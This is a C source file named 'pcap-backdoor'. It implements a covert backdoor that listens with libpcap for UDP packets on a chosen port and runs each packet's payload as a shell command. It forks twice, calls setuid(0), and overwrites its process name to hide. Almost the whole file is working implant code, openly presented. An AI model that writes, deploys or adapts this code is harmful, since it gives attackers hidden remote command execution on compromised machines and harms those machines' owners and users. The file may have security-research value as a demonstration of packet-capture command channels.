// pcap-backdoor
// Copyright (C) 2023 Andrew Rioux
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU Affero General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU Affero General Public License for more details.
//
// You should have received a copy of the GNU Affero General Public License
// along with this program.  If not, see <http://www.gnu.org/licenses/>.

#define _GNU_SOURCE
#include <bsd/unistd.h>
#include <endian.h>
#include <fcntl.h>
#include <libgen.h>
#include <pcap/dlt.h>
#include <pcap/pcap.h>
#include <pthread.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#define OPTSTR "vhlLd:p:sA:P:S"
#define USAGE_FMT                                                              \
  "%s [-v] {-h | -l | [-L -d [device] -p [listening port]"                     \
  " -S]} "                                                                     \
  "{-s | "                                                                     \
  "[-A [remote address] -P [remote port]]}\n"

typedef enum { CMD_UNKNOWN, CMD_HELP, CMD_LIST, CMD_LISTEN } command_t;

typedef struct {
  bool verbose;
  command_t cmd;
  char *device;
  int listen_port;
  bool listen_promisc;
  bool output_use_stdout;
  uint32_t output_target_address;
  uint16_t output_target_port;
  char remote_mac[6];
  char **argv;
} options_t;

typedef struct {
  u_char ether_dhost[6];
  u_char ether_shost[6];
  u_short ether_type;
} ethernet_header_t;

typedef struct {
  u_char ip_vhl;
  u_char ip_tos;
  u_short ip_len;
  u_short ip_id;
  u_short ip_off;
  u_char ip_ttl;
  u_char ip_p;
  u_short ip_sum;
  struct in_addr ip_src, ip_dst;
} ip_header_t;

#define IP_HL(ip) (((ip)->ip_vhl) & 0x0F)
#define IP_V(ip) (((ip)->ip_vhl) >> 4)

typedef struct {
  uint16_t sport, dport;
  uint16_t length, checksum;
} udp_header_t;

typedef struct {
  options_t *options;
  pcap_t *pcap_dev;
} packet_handler_data_t;

int print_devs(options_t *options);
int exec_listen(options_t *options);
void usage(char *progname, int opt);
void handle_packets(u_char *user, const struct pcap_pkthdr *h,
                    const u_char *bytes);

int main(int argc, char **argv) {
  int opt;
  options_t options = {.verbose = 0,
                       .cmd = CMD_UNKNOWN,
                       .device = NULL,
                       .listen_port = 54248,
                       .listen_promisc = false,
                       .output_use_stdout = true,
                       .output_target_address = 0,
                       .output_target_port = 54248,
                       .argv = argv};

  uint8_t *adr = (uint8_t *)&options.output_target_address;
  opterr = 0;

  while ((opt = getopt(argc, argv, OPTSTR)) != EOF) {
    switch (opt) {
    case 'v':
      options.verbose = 1;
      break;

    case 'l':
      if (options.cmd != CMD_UNKNOWN)
        exit(EXIT_FAILURE);
      options.cmd = CMD_LIST;
      break;

    case 'L':
      if (options.cmd != CMD_UNKNOWN)
        exit(EXIT_FAILURE);
      options.cmd = CMD_LISTEN;
      break;

    case 'd':
      options.device = optarg;
      break;

    case 'p':
      options.listen_port = atoi(optarg);
      break;

    case 'S':
      options.listen_promisc = true;
      break;

    case 's':
      options.output_use_stdout = true;
      break;

    case 'A':
      sscanf(optarg, "%hhu.%hhu.%hhu.%hhu", adr, adr + 1, adr + 2, adr + 3);
      break;

    case 'P':
      options.output_target_port = atoi(optarg);
      break;

    case 'h':
    default:
      usage(basename(argv[0]), opt);
      break;
    }
  }

  switch (options.cmd) {
  case CMD_UNKNOWN:
    usage(basename(argv[0]), 0);
    break;

  case CMD_HELP:
    usage(basename(argv[0]), 0);
    break;

  case CMD_LIST:
    if (print_devs(&options) != EXIT_SUCCESS) {
      exit(EXIT_FAILURE);
    }
    break;

  case CMD_LISTEN:
    if (exec_listen(&options) != EXIT_SUCCESS) {
      exit(EXIT_FAILURE);
    }
    break;
  }

  return EXIT_SUCCESS;
}

int print_devs(options_t *options) {
  pcap_if_t *alldevs, *original;
  char errbuf[PCAP_ERRBUF_SIZE];

  if (pcap_findalldevs(&alldevs, errbuf)) {
    fprintf(stderr, "Error: %s\n", errbuf);
    return EXIT_FAILURE;
  }

  original = alldevs;
  printf("Found devices:\n");
  while (alldevs != NULL) {
    pcap_t *dev;

    if ((dev = pcap_create(alldevs->name, errbuf)) == NULL) {
      fprintf(stderr, "\tError getting device info: %s\n", errbuf);
      goto cleanup;
    }

    pcap_activate(dev);
    int dt = pcap_datalink(dev);

    if (dt != 1) {
      goto cleanup;
    }

    printf("%s\n", alldevs->name);

  cleanup:
    pcap_close(dev);
    alldevs = alldevs->next;
  }

  pcap_freealldevs(original);

  return EXIT_SUCCESS;
}

#define LISTEN_ERR(msg, err)                                                   \
  {                                                                            \
    fprintf(stderr, msg, err);                                                 \
    return_code = EXIT_FAILURE;                                                \
    goto cleanup;                                                              \
  }

int exec_listen(options_t *options) {
  if (!options->output_use_stdout && options->output_target_address == 0 &&
      options->output_target_port == 0) {
    return EXIT_FAILURE;
  }

  if (!options->device || !options->listen_port) {
    return EXIT_FAILURE;
  }

  unsigned char mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
  uint32_t saddr = 0x7F000001;

  char *cmd;
  asprintf(&cmd,
           "ip a show %s| grep 'inet ' | awk '{print $2}' | awk -F'/' "
           "'{print $1}'",
           options->device);

  FILE *cfp;
  cfp = popen(cmd, "r");
  if (cfp != NULL) {
    char addr[18];
    if (fgets(addr, 17, cfp) != NULL) {
      const char d[2] = ".";

      char *token = strtok(addr, d);
      int i = 0;

      while (token != NULL && i < 4) {
        saddr = (unsigned char)(0xFF & strtol(token, NULL, 10))
                << ((3 - i) * 8);
        token = strtok(NULL, d);
        i++;
      }
    }
  }

  asprintf(&cmd, "/bin/ip neigh | grep %s | awk '{print $5}'", options->device);

  cfp = popen(cmd, "r");
  if (cfp != NULL) {
    char addr[19];
    if (fgets(addr, 18, cfp) != NULL) {
      const char d[2] = ":";

      char *token = strtok(addr, d);
      int i = 0;

      while (token != NULL && i < 6) {
        mac[i] = (unsigned char)(0xFF & strtol(token, NULL, 16));
        token = strtok(NULL, d);
        i++;
      }
    }
  }

  if (saddr == 0x1F000001)
    fprintf(stderr, "WARNING: Cannot automatically determine IP address to "
                    "use, defaulting to loopback\n");

  if (mac[0] == (unsigned char)0xFF)
    fprintf(stderr, "WARNING: Cannot automatically determine MAC address to "
                    "use, defaulting to broadcast\n");

  int return_code = EXIT_SUCCESS;
  char errbuf[PCAP_ERRBUF_SIZE];
  pcap_t *dev;

  bpf_u_int32 mask, net;

  if (pcap_lookupnet(options->device, &net, &mask, errbuf) == -1) {
    fprintf(stderr, "Error getting device netmask: %s\n", errbuf);
    return_code = EXIT_FAILURE;
    goto early_exit;
  }

  if ((dev = pcap_create(options->device, errbuf)) == NULL)
    LISTEN_ERR("Error getting device info: %s\n", errbuf)

  /*if (pcap_set_promisc(dev, options->listen_promisc))
    LISTEN_ERR("Error setting device to promisc mode: %s\n", pcap_geterr(dev))*/

  if (pcap_set_buffer_size(dev, BUFSIZ))
    LISTEN_ERR("Error setting buffer size: %s\n", pcap_geterr(dev))

  if (pcap_set_timeout(dev, 1000))
    LISTEN_ERR("Error setting device timeout: %s\n", pcap_geterr(dev))

  if (pcap_set_snaplen(dev, 65536))
    LISTEN_ERR("Error setting snap len: %s\n", pcap_geterr(dev))

  if (pcap_activate(dev))
    LISTEN_ERR("Error activating device: %s\n", pcap_geterr(dev))

  if (pcap_datalink(dev) != DLT_EN10MB)
    LISTEN_ERR("Device %s doesn't provide Ethernet headers - not supported\n",
               options->device)

  char *filter_exp;
  asprintf(&filter_exp, "udp dst port %d", options->listen_port);
  printf("Using filter: '%s'\n", filter_exp);
  struct bpf_program fp;

  if (pcap_compile(dev, &fp, filter_exp, 0, net) == -1)
    LISTEN_ERR("Couldn't parse filter: %s\n", pcap_geterr(dev))

  if (pcap_setfilter(dev, &fp) == -1)
    LISTEN_ERR("Couldn't install filter: %s\n", pcap_geterr(dev))

  packet_handler_data_t context = {.options = options, .pcap_dev = dev};

  pcap_loop(dev, 0, handle_packets, (u_char *)&context);

  printf("Done!\n");

cleanup:
  pcap_close(dev);

early_exit:
  return return_code;
}

void usage(char *progname, int opt) {
  fprintf(stderr, USAGE_FMT, progname);
  exit(EXIT_FAILURE);
}

void handle_packets(u_char *user, const struct pcap_pkthdr *header,
                    const u_char *packet) {
  packet_handler_data_t *data = (packet_handler_data_t *)user;

  const ip_header_t *ip;
  const udp_header_t *udp;
  const char *pdata;
  u_int size_ip;

  if (data->options->verbose)
    printf("\t(V) Parsing packet of length: %d\n", header->caplen);

  ip = (ip_header_t *)(packet + 14);
  size_ip = IP_HL(ip) * 4;

  if (size_ip < 20) {
    if (data->options->verbose) {
      fprintf(stderr,
              "\t(V) IP header length received, pointer, packet pointer: %d, "
              "%p, %p\n\t",
              ip->ip_vhl, (void *)&ip->ip_vhl, (void *)packet);
      for (int i = 0; i < 48; i++) {
        fprintf(stderr, "%x ", packet[i]);
      }
      fprintf(stderr, "\n");
    }
    fprintf(stderr, "\t* Invalid IP header length: %d bytes\n", size_ip);
    return;
  }

  if (ip->ip_p != 17) {
    fprintf(stderr, "\t* Invalid IP packet type received: %d\n", ip->ip_p);
    return;
  }

  udp = (udp_header_t *)(packet + 14 + size_ip);
  /*if (be16toh(udp->length) + size_ip + 14 + 8 != header->caplen) {
    fprintf(stderr,
            "\t* Invalid captured packet length (len, caplen, len, IP size, UDP
  size): %d, %d: %d, "
            "%d, %d\n",
            header->len, header->caplen, be16toh(udp->length) + size_ip + 14 +
  8, size_ip, be16toh(udp->length)); return;
  }*/

  int udplen = be16toh(udp->length);

  pdata = (const char *)(packet + 14 + size_ip + 8);

  if (data->options->verbose) {
    printf("\t(V) Got packet: %s\n", pdata);
  }

  char *cmd = (char *)malloc(udplen + 1);
  cmd[udplen] = '\0';

  strncpy(cmd, pdata, udplen);

  if (data->options->output_use_stdout) {
    printf("Command output for: %s\n", cmd);
    fflush(stdout);
  }

  int pid;
  if (!(pid = fork())) {
    pcap_close(data->pcap_dev);
    if (!fork()) {
      setuid(0);
      chdir("/");
      FILE *op = popen(cmd, "r");
      char line[1028];

      memcpy(data->options->argv[0], "whatsthelengthlimithere\0", 24);

      while (fgets(line, 1028, op)) {
        if (data->options->output_use_stdout) {
          printf("%s\n", line);
        } else {
          // TODO
          // Not as critical to demonstrat the point, but should implement it so
          // that the program uses pcap_sendpacket to send response packets out
          //
          // See man 3 pcap_sendpacket for implementation details
        }
      }

      exit(0);
    }
    exit(0);
  } else {
    int status;
    waitpid(pid, &status, 0);
    kill(pid, SIGKILL);
  }
}
